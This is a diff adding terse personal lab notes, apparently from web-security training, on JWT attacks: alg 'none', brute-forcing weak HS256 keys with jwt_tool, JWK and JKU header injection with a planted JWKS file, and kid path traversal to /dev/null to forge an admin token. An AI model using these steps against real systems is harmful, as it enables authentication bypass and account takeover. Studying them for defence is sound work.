@@ -1,0 +1,44 @@
+- Via unverified signature
+-- Just edit JWT
+
+- Via flawed signature verification
+-- Changed algorithm to none
+
+- Via weak signing key
+-- Used this command to brute force: python3 jwt_tool.py --crack -d jwt.secrets.list "JWT"
+-- Look for HS256
+
+- Via JWK header injection
+-- I already have a key, so just go to JSON Web Token Tab
+-- -- Select attack and Embedded JWK
+-- -- Click ok
+
+- Via JKU header injection
+-- exploit server file: /.well-known/jwks.json
+-- In exploit server body:
+--------------------------------------------------------------------------------------
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "1d2df33b-35a7-4e38-93ba-67ea9b335d07",
+            "n": "mPG8fE0t_tRdPdoWrLGKRt4Ocbpo_x4eUFQwW19mTd86P5FM_gnzDnrgDo36gnIgGe97Wq8FuARNGJPi3WEFe3SPHknzssVu4KIGByhYDZXvbRm2J2Aik3U0QffOQ5af53qr2emrVKSR-j7mULOXxrK0g39Zqox9xaPwFDvf3u12LGdodTQxhPYEhYIPlptrhp7YN7FwV05Xb-8GeJfmD2usZ9eg_-g9V5ZqvMAk5tjk3J1Y_H2BZeONY7kGFerlUGsFCm9BFZ3LtZzMtvab98-amiSsnMkRH3dokKQn8gLsCwYl2L0AypZpcovkKrMOBmjxPJULsUehOduwj2leZQ"
+        }
+    ]
+}
+--------------------------------------------------------------------------------------------
+-- Change kid in the JWT header to the kid
+-- Sign with my RSA key
+
+- Via kid path traversal
+-- Also HS256
+-- In JSON web token click attack and sign with empty key
+-- In the kid try:
+-----------------------------------------------------
+/dev/null
+../dev/null
+etc.
+-----------------------------------------------------
+-- When you get 200 that means it worked 
+-- Change user to admin user
